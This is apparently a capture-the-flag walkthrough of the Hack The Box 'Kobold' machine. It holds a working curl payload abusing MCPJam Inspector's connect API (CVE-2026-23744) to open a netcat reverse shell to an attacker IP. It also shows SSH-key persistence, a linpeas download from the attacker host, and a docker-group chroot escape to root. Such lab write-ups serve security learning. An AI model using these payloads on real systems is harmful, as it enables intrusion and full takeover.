# Kobold: Easy

```sh
sudo vim /etc/hosts
# add kobold.htb

nmap -T4 -p- -A -Pn -v kobold.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
    * 80/tcp: http: nginx 1.24.0
    * 443/tcp: ssl/http: nginx 1.24.0
    * 3552/tcp: taserver?

* the webpage on port 80 redirects to the HTTPS version on port 443 to a website for 'Kobold Operations Suite'

* the webpage is a platform for service & container management with AI; but it is not ready yet, and the page does not contain any other links

* the website footer mentions the email 'admin@kobold.htb'

* the webpage on port 3552 leads to a login page for [Arcane: a webapp for docker & container management](https://github.com/getarcaneapp/arcane)

* the footer in the Arcane login page mentions the version 1.13.0

* Googling for default creds for Arcane gives 'arcane:arcane-admin'; trying this, as well as 'admin:arcane-admin' or 'admin:admin' fails and we are unable to login

* web enumeration:

    ```sh
    feroxbuster -u https://kobold.htb -k -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,js,md --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent
    # dir scan of main page with small wordlist

    feroxbuster -u http://kobold.htb:3552/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,js,md --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent
    # dir scan of arcane page with small wordlist

    ffuf -c -u 'https://kobold.htb' -H 'Host: FUZZ.kobold.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 154 -s
    # subdomain scan of main page

    ffuf -c -u 'http://kobold.htb:3552' -H 'Host: FUZZ.kobold.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 2081 -s
    # subdomain scan of arcane page
    ```

* Googling for any exploits associated with Arcane 1.13.0 leads to [CVE-2026-23520: an authenticated RCE vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2026-23520), but this affects releases prior to 1.13.0, and is patched in this release

* checking for other exploits, we also get results for [CVE-2026-23944: unauthorized access to remote environment resources](https://nvd.nist.gov/vuln/detail/CVE-2026-23944)

* searching for exploits do not give any details for CVE-2026-23944, but we have multiple hits for the supposedly fixed exploit CVE-2026-23520: we can try it but it requires an authenticated user

* from the subdomain scan for the main page, ```ffuf``` gives us a few subdomains: we can update these entries in ```/etc/hosts```:

    * mcp.kobold.htb
    * bin.kobold.htb

* checking the page 'https://mcp.kobold.htb' leads to MCPJam Inspector, a development platform for MCP servers and AI agents

* we can explore MCPJam further for any context; currently no servers are connected

* we have options to sign in or create an account, but neither of them work due to incorrect redirect address

* checking in the settings section shows the MCPJam version v1.4.2

* Googling for exploits associated with MCPJam Inspector 1.4.2 leads to [CVE-2026-23744: a RCE exploit](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)

* before trying the exploit for MCPJam, we can check the contents of the other subdomain

* navigating to 'https://bin.kobold.htb', we get the webpage for PrivateBin: an online pastebin tool

* the footer shows that it is running PrivateBin version 2.0.2; Googling for exploits associated with this version does not give anything

* we can try checking the exploits for CVE-2026-23744; [the Github advisory includes a POC that we can follow](https://github.com/advisories/GHSA-232v-j27c-5pp6):

    * MCPJam Inspector binds to ```0.0.0.0``` which makes its HTTP APIs remotely reachable

    * so, we can abuse the ```/api/mcp/connect``` API endpoint using its ```command``` and ```arg``` parameters

    * the RCE payload given in the POC is for a Windows system:

        ```cmd
        curl http://10.97.58.83:6274/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"cmd.exe\",\"args\":[\"/c\", \"calc\"],\"env\":{}},\"serverId\":\"mytest\"}"
        ```
    
    * we can modify this POC for Linux commands:

        ```sh
        sudo tcpdump -i tun0 icmp
        # setup listener for pings
        ```

        ```sh
        curl https://mcp.kobold.htb/api/mcp/connect -k -H "Content-Type: application/json" -d '{"serverConfig":{"command":"/bin/sh","args":["-c","ping -c 3 10.10.14.95"],"env":{}},"serverId":"mytest"}'
        # -k to ignore SSL certificate warning

        curl https://mcp.kobold.htb/api/mcp/connect -k -H "Content-Type: application/json" -d '{"serverConfig":{"command":"ping","args":["-c","3","10.10.14.95"],"env":{}},"serverId":"mytest"}'
        # similar payload to test without '/bin/sh'
        ```
    
    * both payloads work and we get ICMP packets on our ```tcpdump``` listener

    * we can use a similar payload with reverse-shell one-liners for RCE:

        ```sh
        nc -nvlp 4444
        # setup listener

        curl https://mcp.kobold.htb/api/mcp/connect -k -H "Content-Type: application/json" -d '{"serverConfig":{"command":"busybox","args":["nc","10.10.14.95","4444","-e","sh"],"env":{}},"serverId":"mytest"}'
        # test with revshell one-liners
        # this works and we have reverse shell now
        ```

* in reverse shell:

    ```sh
    id
    # user 'ben'
    # we are also part of a non-default group 'operator'

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # '/usr/local/lib/node_modules/@mcpjam/inspector'

    cat /etc/passwd
    # mentions users 'ben' and 'alice'

    ls -la /home

    ls -la /home/ben
    # check all files

    cat /home/ben/user.txt
    # user flag
    
    ls -la /home/alice
    # permission denied

    ls -la /
    # non-default folders found

    ls -la /app

    ls -la /app/data

    ls -la /app/data/projects
    # empty
    
    ls -la /privatebin-data
    # check all files

    ls -la /privatebin-data/data
    # contains more files
    ```

    * ```/etc/passwd``` and ```/home``` contents confirm two standard users: 'ben' & 'alice'

    * 'ben' is part of a non-default group 'operator'

    * listing ```/``` shows a couple of non-default folders: 'app' and 'privatebin-data': the latter is readable by the 'operator' group

    * the ```/app``` folder includes a 'projects' subfolder, but it is empty

    * checking the ```/privatebin-data``` folder, we have a 'data' subfolder with more files like 'salt.php': but there are no online documentation or posts indicating that this can be cracked

* as we have access as user 'ben', we can first try creating SSH access for persistence:

    ```sh
    # in reverse shell

    cd

    ls -la
    # no '.ssh' folder

    mkdir .ssh

    cd .ssh
    ```
    
    ```sh
    # on attacker

    ssh-keygen -f ben
    # generate key pair without any passphrase

    chmod 600 ben

    cat ben.pub
    # copy the public key
    ```

    ```sh
    # in reverse shell
    
    echo 'ssh-rsa ...' > authorized_keys
    # paste public key contents into 'authorized_keys' file

    chmod 600 authorized_keys
    ```

    ```sh
    # on attacker

    ssh -i ben ben@kobold.htb
    # this works
    ```

* as we have stable SSH access as user 'ben', we can try initial enumeration using ```linpeas``` - fetch the script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 6.8.0-106-generic, Ubuntu 24.04.4
    * sudo version 1.9.15p5
    * the machine is running as a docker container
    * listening on multiple ports locally: 8080, 41693, 6274
    * user 'ben' is part of 'operator' group; user 'alice' is part of groups 'operator' & 'docker'
    * ```/usr/bin/bash``` is root-owned but writable

* checking the local ports listening gives the same webpages as before, so we can ignore that

* as the machine is running as a Docker container, and the user 'alice' is part of the 'docker' group, we can try to enumerate for any Docker-related privesc vectors:

    ```sh
    which docker
    # docker installed

    docker images
    # "permission denied while trying to connect to the Docker daemon socket"
    ```

* as 'alice' user is part of both 'operator' & 'docker' groups, but 'ben' user is part of only 'operator' group, we can verify next if our user can switch groups: found this from another walkthrough:

    ```sh
    which newgrp
    # '/usr/bin/newgrp'

    newgrp docker
    # adds current user to 'docker' group

    id
    # we are part of 'docker' group now

    docker images
    # lists 2 images
    ```

    ```sh
    # alternate way of using 'docker' group

    sg docker -c 'docker images'
    # 'sg' can be used to switch group contexts
    # this executes the command 'docker images' as 'docker' group member
    ```

* as 'ben' is part of 'docker' group now, we can use ```docker``` commands

* ```docker images``` lists ```mysql``` and ```privatebin/nginx-fpm-alpine``` - we can [use either of the images to get a privileged shell](https://exploitnotes.org/exploit/container/docker/docker-escape#run-existing-docker-image):

    ```sh
    docker images

    docker run -v /:/mnt --rm -it mysql chroot /mnt sh
    # -v to mount '/' to '/mnt'
    # -it for interactive shell
    # chroot to change root directory to '/mnt'
    # this gives us root shell

    id
    # root

    cat /root/root.txt
    # root flag
    ```
